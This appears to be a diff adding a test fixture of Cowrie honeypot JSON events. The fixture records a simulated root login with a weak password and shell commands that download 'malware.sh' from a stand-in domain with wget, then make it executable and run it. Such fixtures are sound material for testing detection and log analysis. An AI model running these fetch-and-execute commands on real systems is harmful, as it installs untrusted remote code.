@@ -1,0 +1,51 @@
+[
+  {
+    "eventid": "cowrie.session.connect",
+    "session": "c9281a8c-test",
+    "src_ip": "185.15.20.10",
+    "timestamp": "2023-10-01T12:00:00Z"
+  },
+  {
+    "eventid": "cowrie.login.success",
+    "session": "c9281a8c-test",
+    "src_ip": "185.15.20.10",
+    "timestamp": "2023-10-01T12:00:05Z",
+    "username": "root",
+    "password": "password123"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "session": "c9281a8c-test",
+    "src_ip": "185.15.20.10",
+    "timestamp": "2023-10-01T12:00:10Z",
+    "input": "whoami"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "session": "c9281a8c-test",
+    "src_ip": "185.15.20.10",
+    "timestamp": "2023-10-01T12:00:12Z",
+    "input": "wget http://bad-domain.com/malware.sh"
+  },
+  {
+    "eventid": "cowrie.command.input",
+    "session": "c9281a8c-test",
+    "src_ip": "185.15.20.10",
+    "timestamp": "2023-10-01T12:00:15Z",
+    "input": "chmod +x malware.sh && ./malware.sh"
+  },
+  {
+    "eventid": "cowrie.session.file_download",
+    "session": "c9281a8c-test",
+    "src_ip": "185.15.20.10",
+    "timestamp": "2023-10-01T12:00:20Z",
+    "shasum": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+  },
+  {
+    "eventid": "cowrie.session.closed",
+    "session": "c9281a8c-test",
+    "src_ip": "185.15.20.10",
+    "timestamp": "2023-10-01T12:01:00Z",
+    "duration": 60.0
+  }
+]
